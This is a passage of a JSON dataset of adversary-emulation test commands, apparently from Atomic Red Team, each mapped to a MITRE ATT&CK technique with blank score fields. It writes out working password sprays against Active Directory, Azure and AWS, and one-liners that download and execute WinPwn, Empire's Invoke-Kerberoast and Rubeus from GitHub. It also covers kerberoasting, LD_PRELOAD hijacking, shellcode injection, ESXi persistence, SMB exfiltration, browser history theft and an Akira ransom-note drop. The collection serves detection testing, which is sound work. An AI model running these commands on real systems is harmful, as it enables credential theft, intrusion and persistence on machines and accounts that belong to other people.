$env:Userprofile\\Desktop\\akira_readme.txt\necho \"\" >> $env:Userprofile\\Desktop\\akira_readme.txt\necho \"Keep in mind that the faster you will get in touch, the less damage we cause\" >> $env:Userprofile\\Desktop\\akira_readme.txt\n",
        "Description": "Dropping 100 files with random content and .akira File Extension and the Akira Ransomnote to c:\\\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1486",
        "Shell": "powershell"
    },
    {
        "ID": 908,
        "Command": "@FOR /F %n in (%temp%\\users.txt) do @echo | set/p=. & @net use %logonserver%\\IPC$ /user:\"%userdomain%\\%n\" \"Spring2020\" 1>NUL 2>&1 && @echo [*] %n:Spring2020 && @net use /delete %logonserver%\\IPC$ > NUL\n",
        "Description": "CAUTION! Be very careful to not exceed the password lockout threshold for users in the domain by running this test too frequently.\nThis atomic attempts to map the IPC$ share on one of the Domain Controllers using a password of Spring2020 for each user in the %temp%\\users.txt list. Any successful authentications will be printed to the screen with a message like \"[*] username:password\", whereas a failed auth will simply print a period. Use the input arguments to specify your own password to use for the password spray.\nUse the get_prereq_command's to create a list of all domain users in the temp directory called users.txt.\nSee the \"Windows FOR Loop Password Spraying Made Easy\" blog by @OrOneEqualsOne for more details on how these spray commands work. https://medium.com/walmartlabs/windows-for-loop-password-spraying-made-easy-c8cd4ebb86b5",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 909,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain $Env:USERDOMAIN -Force\n",
        "Description": "Perform a domain password spray using the DomainPasswordSpray tool. It will try a single password against all users in the domain\n\nhttps://github.com/dafthack/DomainPasswordSpray\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.003",
        "Shell": "powershell"
    },
    {
        "ID": 910,
        "Command": "if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {\n  Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\"\n  exit 1\n}\n\n$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server $env:UserDnsDomain | Select-Object -ExpandProperty SamAccountName\n\n[System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null\n$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389)\n\n$DomainUsers | Foreach-Object {\n  $user = $_\n  $password = 'P@ssw0rd!'\n\n  $credz = new-object System.Net.NetworkCredential($user, $password, \"$env:UserDnsDomain\")\n  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)\n  try {\n\\tWrite-Host \" [-] Attempting ${password} on account ${user}.\"\n\\t$conn.bind()\n\\t# if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n\\tWrite-Host \" [!] ${user}:${password} are valid credentials!\"\n  } catch {\n\\tWrite-Host $_.Exception.Message\n  }\n}\nWrite-Host \"End of password spraying\"\n",
        "Description": "Attempt to brute force all Active Directory domain users with a single password (called \"password spraying\") on a domain controller, via LDAP, with NTLM or Kerberos\n\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user (to fetch the list of all domain users)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.003",
        "Shell": "powershell"
    },
    {
        "ID": 911,
        "Command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contoso.com\", $Pword\nConnect-AzureAD -Credential $Credential > $null\n\n($Users = Get-AzureADUser -All $true) > $null\nDisconnect-AzureAD > $null\n$PWord = ConvertTo-SecureString -String \"P@ssw0rd!\" -AsPlainText -Force\n\n$Users | Foreach-Object {\n  $user = $_.UserPrincipalName\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"$user\", $Pword\n  try {\n\\tWrite-Host \" [-] Attempting P@ssw0rd! on account ${user}.\"\n\\tConnect-AzureAD -Credential $Credential 2>&1> $null\n\\t# if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n\\tWrite-Host \" [!] ${user}:P@ssw0rd! are valid credentials!`r`n\"\n\\tDisconnect-AzureAD > $null\n  } catch {\n\\tWrite-Host \" [-] ${user}:P@ssw0rd! invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of password spraying\"\n",
        "Description": "Attempt to brute force all Azure AD users with a single password (called \"password spraying\") via AzureAD Powershell module.\nValid credentials are only needed to fetch the list of Azure AD users.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.003",
        "Shell": "powershell"
    },
    {
        "ID": 912,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndomainpassspray -consoleoutput -noninteractive -emptypasswords",
        "Description": "DomainPasswordSpray Attacks technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.003",
        "Shell": "powershell"
    },
    {
        "ID": 913,
        "Command": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n\\tWrite-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"Spring2020\" $env:Temp\\usersdpsLight.txt\n",
        "Description": "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.003",
        "Shell": "powershell"
    },
    {
        "ID": 914,
        "Command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\MSOLSpray.ps1\"\nInvoke-MSOLSpray -UserList \"$env:temp\\T1110.003UserList.txt\" -Password \"P@ssword1\"\n",
        "Description": "This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.003",
        "Shell": "powershell"
    },
    {
        "ID": 915,
        "Command": "cd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe passwordspray --dc $ENV:userdnsdomain -d $ENV:userdomain \"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt\" password132 \n",
        "Description": "Test a single password against a list of users\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.003",
        "Shell": "powershell"
    },
    {
        "ID": 916,
        "Command": "cd /tmp\ngit clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git\ncd /tmp/GoAWSConsoleSpray\ngo run main.go GoAWSConsoleSpray -a XXXXXXXX -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt\n",
        "Description": "GoAWSConsoleSpray is a tool that can be used to spray AWS IAM Console Credentials in order to identify a valid login for a user account built by WhiteOakSecurity. For more details reagrding the tool, check - https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1110.003",
        "Shell": "sh"
    },
    {
        "ID": 917,
        "Command": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done\n",
        "Description": "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1046",
        "Shell": "bash"
    },
    {
        "ID": 918,
        "Command": "sudo nmap -sS 192.168.1.0/24 -p 80\ntelnet 192.168.1.1 80\nnc -nv 192.168.1.1 80\n",
        "Description": "Scan ports to check for listening ports with Nmap.\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1046",
        "Shell": "sh"
    },
    {
        "ID": 919,
        "Command": "nmap 127.0.0.1",
        "Description": "Scan ports to check for listening ports for the local host 127.0.0.1",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1046",
        "Shell": "powershell"
    },
    {
        "ID": 920,
        "Command": "python \"PathToAtomicsFolder\\T1046\\src\\T1046.py\" -i 127.0.0.1\n",
        "Description": "Scan ports to check for listening ports with python\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1046",
        "Shell": "powershell"
    },
    {
        "ID": 921,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nspoolvulnscan -noninteractive -consoleoutput",
        "Description": "Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1046",
        "Shell": "powershell"
    },
    {
        "ID": 922,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMS17-10 -noninteractive -consoleoutput",
        "Description": "Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1046",
        "Shell": "powershell"
    },
    {
        "ID": 923,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nbluekeep -noninteractive -consoleoutput",
        "Description": "Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1046",
        "Shell": "powershell"
    },
    {
        "ID": 924,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nfruit -noninteractive -consoleoutput",
        "Description": "Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1046",
        "Shell": "powershell"
    },
    {
        "ID": 925,
        "Command": "docker build -t t1046 $PathToAtomicsFolder/T1046/src/\ndocker run --name t1046_container --rm -d -t t1046\ndocker exec t1046_container /scan.sh",
        "Description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1046",
        "Shell": "sh"
    },
    {
        "ID": 926,
        "Command": "$ipAddr = \"\"\nif ($ipAddr -like \"*,*\") {\n\\t$ip_list = $ipAddr -split \",\"\n\\t$ip_list = $ip_list.ForEach({ $_.Trim() })\n\\tWrite-Host \"[i] IP Address List: $ip_list\"\n\n\\t$ports = 445, 3389\n\n\\tforeach ($ip in $ip_list) {\n\\t\\tforeach ($port in $ports) {\n\\t\\t\\tWrite-Host \"[i] Establishing connection to: $ip : $port\"\n\\t\\t\\ttry {\n\\t\\t\\t\\t$tcp = New-Object Net.Sockets.TcpClient\n\\t\\t\\t\\t$tcp.ConnectAsync($ip, $port).Wait(200) | Out-Null\n\\t\\t\\t} catch {}\n\\t\\t\\tif ($tcp.Connected) {\n\\t\\t\\t\\t$tcp.Close()\n\\t\\t\\t\\tWrite-Host \"Port $port is open on $ip\"\n\\t\\t\\t}\n\\t\\t}\n\\t}\n} elseif ($ipAddr -notlike \"*,*\") {\n\\tif ($ipAddr -eq \"\") {\n\\t\\t# Assumes the \"primary\" interface is shown at the top\n\\t\\t$interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1\n\\t\\tWrite-Host \"[i] Using Interface $interface\"\n\\t\\t$ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress\n\\t}\n\\tWrite-Host \"[i] Base IP-Address for Subnet: $ipAddr\"\n\\t$subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)\n\\t# Always assumes /24 subnet\n\\tWrite-Host \"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\"\n\n\\t$ports = 445, 3389\n\\t$subnetIPs = 1..254 | ForEach-Object { \"$subnetSubstring$_\" }\n\n\\tforeach ($ip in $subnetIPs) {\n\\t\\tforeach ($port in $ports) {\n\\t\\t\\ttry {\n\\t\\t\\t\\t$tcp = New-Object Net.Sockets.TcpClient\n\\t\\t\\t\\t$tcp.ConnectAsync($ip, $port).Wait(200) | Out-Null\n\\t\\t\\t} catch {}\n\\t\\t\\tif ($tcp.Connected) {\n\\t\\t\\t\\t$tcp.Close()\n\\t\\t\\t\\tWrite-Host \"Port $port is open on $ip\"\n\\t\\t\\t}\n\\t\\t}\n\\t}\n} else {\n\\tWrite-Host \"[Error] Invalid Inputs\"\n\\texit 1\n}",
        "Description": "Scanning common ports in a /24 subnet. If no IP address for the target subnet is specified the test tries to determine the attacking machine's \"primary\" IPv4 address first and then scans that address with a /24 netmask.\nThe connection attempts to use a timeout parameter in milliseconds to speed up the scan. Please note the atomic might not print any output until the scans are completed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1046",
        "Shell": "powershell"
    },
    {
        "ID": 927,
        "Command": "Get-Service -Name \"Remote Desktop Services\", \"Remote Desktop Configuration\"\n",
        "Description": "Availability of remote desktop services can be checked using get- cmdlet of PowerShell\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1046",
        "Shell": "powershell"
    },
    {
        "ID": 928,
        "Command": "nmap -Pn -sV -p 0-65535 127.0.0.1\n",
        "Description": "Scan multiple ports to check for listening ports with nmap\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1046",
        "Shell": "sh"
    },
    {
        "ID": 929,
        "Command": "sudo sh -c 'echo /tmp/T1574006.so > /etc/ld.so.preload'\n",
        "Description": "This test adds a shared library to the `ld.so.preload` list to execute and intercept API calls. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will echo `../bin/T1574.006.so` to /etc/ld.so.preload. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.006",
        "Shell": "bash"
    },
    {
        "ID": 930,
        "Command": "LD_PRELOAD=/tmp/T1574006.so ls\n",
        "Description": "This test injects a shared object library via the LD_PRELOAD environment variable to execute. This technique was used by threat actor Rocke during the exploitation of Linux web servers. This requires the `glibc` package.\n\nUpon successful execution, bash will utilize LD_PRELOAD to load the shared object library `/etc/ld.so.preload`. Output will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.006",
        "Shell": "bash"
    },
    {
        "ID": 931,
        "Command": "DYLD_INSERT_LIBRARIES=/tmp/T1574006MOS.dylib /Applications/Firefox.app/Contents/MacOS/firefox\n",
        "Description": "injects a dylib that opens calculator via env variable\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.006",
        "Shell": "bash"
    },
    {
        "ID": 932,
        "Command": "assoc .hta=txtfile\n",
        "Description": "Change Default File Association From cmd.exe of hta to notepad.\n\nUpon successful execution, cmd.exe will change the file association of .hta to notepad.exe. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 933,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)\nInvoke-Kerberoast | fl\n",
        "Description": "This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1\nThe following are further sources and credits for this attack:\n[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\nwhen executed successfully , the test displays available services with their hashes. \nIf the testing domain doesn't have any service principal name configured, there is no output\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1558.003",
        "Shell": "powershell"
    },
    {
        "ID": 934,
        "Command": "klist purge\ncmd.exe /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe\" kerberoast  /outfile:\"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt\"\n",
        "Description": "Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast\nThis build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1558.003",
        "Shell": "powershell"
    },
    {
        "ID": 935,
        "Command": "setspn -T %USERDNSDOMAIN% -Q */*\n",
        "Description": "The following test will utilize setspn to extract the Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output all the SPNs for the related domain. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1558.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 936,
        "Command": "Add-Type -AssemblyName System.IdentityModel\n$ComputerFQDN=$env:LogonServer.trimStart('\\') + \".\" + $env:UserDnsDomain\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"HTTP/$ComputerFQDN\" \n",
        "Description": "The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the endpoint in question.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1558.003",
        "Shell": "powershell"
    },
    {
        "ID": 937,
        "Command": "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T %USERDNSDOMAIN% -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  \n",
        "Description": "The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the domain in question.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1558.003",
        "Shell": "powershell"
    },
    {
        "ID": 938,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nKerberoasting -consoleoutput -noninteractive",
        "Description": "Kerberoasting technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1558.003",
        "Shell": "powershell"
    },
    {
        "ID": 939,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')\nInvoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\"",
        "Description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1558.003",
        "Shell": "powershell"
    },
    {
        "ID": 940,
        "Command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server atomic.local -User root -Password pass\nGet-VMHostService -VMHost atomic.local | Where-Object {$_.Key -eq \"TSM-SSH\" } | Start-VMHostService -Confirm:$false\n",
        "Description": "An adversary enables the SSH service on a ESXi host to maintain persistent access to the host and to carryout subsequent operations.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.004",
        "Shell": "powershell"
    },
    {
        "ID": 941,
        "Command": "echo \"\" | \"PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\" -batch \"atomic.local\" -ssh -l root -pw \"password\" \"vim-cmd hostsvc/enable_ssh\"\n",
        "Description": "An adversary enables SSH on an ESXi host to maintain persistence and creeate another command execution interface.\n[Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#enable%20service)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 942,
        "Command": "New-SmbMapping -RemotePath '\\\\example.com\\sales' -TransportType QUIC -SkipCertificateCheck\ncopy 'C:\\path\\to\\file.txt' 'Z:\\'\n",
        "Description": "Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1570",
        "Shell": "powershell"
    },
    {
        "ID": 943,
        "Command": "NET USE * '\\\\example.com\\sales' /TRANSPORT:QUIC /SKIPCERTCHECK\ncopy 'C:\\path\\to\\file.txt' '*:\\'\n",
        "Description": "Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1570",
        "Shell": "powershell"
    },
    {
        "ID": 944,
        "Command": "\"PathToAtomicsFolder\\T1055.004\\bin\\T1055.exe\"\n",
        "Description": "Process Injection using C#\nreference: https://github.com/pwndizzle/c-sharp-memory-injection\nExcercises Five Techniques\n1. Process injection\n2. ApcInjectionAnyProcess\n3. ApcInjectionNewProcess\n4. IatInjection\n5. ThreadHijack\nUpon successful execution, cmd.exe will execute T1055.exe, which exercises 5 techniques. Output will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 945,
        "Command": "$PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe -program \"C:\\Windows\\System32\\werfault.exe\" -debug\n",
        "Description": "Creates a process in a suspended state and calls QueueUserAPC WinAPI to add a UserAPC to the child process that points to allocated shellcode. \nResumeThread is called which then calls NtTestAlert to execute the created UserAPC which then executes the shellcode.\nThis technique allows for the early execution of shellcode and potentially before AV/EDR can hook functions to support detection.\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode#createprocesswithpipe)\n- References: \n  - https://www.bleepingcomputer.com/news/security/early-bird-code-injection-technique-helps-malware-stay-undetected/\n  - https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055.004",
        "Shell": "powershell"
    },
    {
        "ID": 946,
        "Command": "$PathToAtomicsFolder\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe -debug\n",
        "Description": "Uses the undocumented NtQueueAPCThreadEx WinAPI to create a \"Special User APC\" in the current thread of the current process to execute shellcode. \nSince the shellcode is loaded and executed in the current process it is considered local shellcode execution.\n\nSteps taken with this technique\n1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write\n2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space\n3. Change the memory page permissions to Execute/Read with VirtualProtect\n4. Get a handle to the current thread\n5. Execute the shellcode in the current thread by creating a Special User APC through the NtQueueApcThreadEx function\n\n- PoC Credit: (https://github.com/Ne0nd0g/go-shellcode/tree/master#rtlcreateuserthread)\n- References:\n  - https://repnz.github.io/posts/apc/user-apc/\n  - https://docs.rs/ntapi/0.3.1/ntapi/ntpsapi/fn.NtQueueApcThreadEx.html\n  - https://0x00sec.org/t/process-injection-apc-injection/24608\n  - https://twitter.com/aionescu/status/992264290924032005\n  - http://www.opening-windows.com/techart_windows_vista_apc_internals2.htm#_Toc229652505\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1055.004",
        "Shell": "powershell"
    },
    {
        "ID": 947,
        "Command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> /tmp/T1217-Firefox.txt \\;\ncat /tmp/T1217-Firefox.txt 2>/dev/null\n",
        "Description": "Searches for Mozilla Firefox's places.sqlite file (on FreeBSD or Linux distributions) that contains bookmarks and lists any found instances to a text file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1217",
        "Shell": "sh"
    },
    {
        "ID": 948,
        "Command": "find / -path \"*/Firefox/Profiles/*/places.sqlite\" -exec echo {} >> /tmp/T1217_Firefox.txt \\;\ncat /tmp/T1217_Firefox.txt 2>/dev/null\n",
        "Description": "Searches for Mozilla Firefox's places.sqlite file (on macOS) that contains bookmarks and lists any found instances to a text file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1217",
        "Shell": "sh"
    },
    {
        "ID": 949,
        "Command": "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> /tmp/T1217-Chrome.txt \\;\ncat /tmp/T1217-Chrome.txt 2>/dev/null\n",
        "Description": "Searches for Google Chrome's Bookmark file (on macOS) that contains bookmarks in JSON format and lists any found instances to a text file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1217",
        "Shell": "sh"
    },
    {
        "ID": 950,
        "Command": "find / -path \"*/.config/chromium/*/Bookmarks\" -exec echo {} >> /tmp/T1217-Chrome.txt \\;\ncat /tmp/T1217-Chrome.txt 2>/dev/null\n",
        "Description": "Searches for Google Chromium's Bookmark file (on FreeBSD) that contains bookmarks in JSON format and lists any found instances to a text file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1217",
        "Shell": "sh"
    },
    {
        "ID": 951,
        "Command": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force\n",
        "Description": "Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1217",
        "Shell": "powershell"
    },
    {
        "ID": 952,
        "Command": "where /R C:\\Users\\ Bookmarks\n",
        "Description": "Searches for Google Chromes's and Edge Chromium's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1217",
        "Shell": "command_prompt"
    },
    {
        "ID": 953,
        "Command": "where /R C:\\Users\\ places.sqlite\n",
        "Description": "Searches for Mozilla Firefox bookmarks file (on Windows distributions) that contains bookmarks in a SQLITE database.\nUpon execution, paths that contain bookmark files will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1217",
        "Shell": "command_prompt"
    },
    {
        "ID": 954,
        "Command": "dir /s /b %USERPROFILE%\\Favorites\n",
        "Description": "This test will list the bookmarks for Internet Explorer that are found in the Favorites folder",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1217",
        "Shell": "command_prompt"
    },
    {
        "ID": 955,
        "Command": "find / -path \"*/Safari/Bookmarks.plist\" 2>/dev/null >> /tmp/T1217-Safari.txt \ncat /tmp/T1217-Safari.txt \n",
        "Description": "This test searches for Safari's Bookmarks file (on macOS) and lists any found instances to a text file.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1217",
        "Shell": "sh"
    },
    {
        "ID": 956,
        "Command": "$URL_Regex = '(htt(p|s))://([\\w-]+\\.)+[\\w-]+(/[\\w- ./?%&=]*)*?'\n$History = Get-Content -Path \"$Env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\History\" | Select-String -AllMatches $URL_Regex | ForEach-Object { $_.Matches.Value } | Sort -Unique\n$History | Out-File -FilePath \"$Env:USERPROFILE\\Downloads\\edgebrowsinghistory.txt\"\n",
        "Description": "This test will extract Microsoft Edge browser's history of current user\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1217",
        "Shell": "powershell"
    },
    {
        "ID": 957,
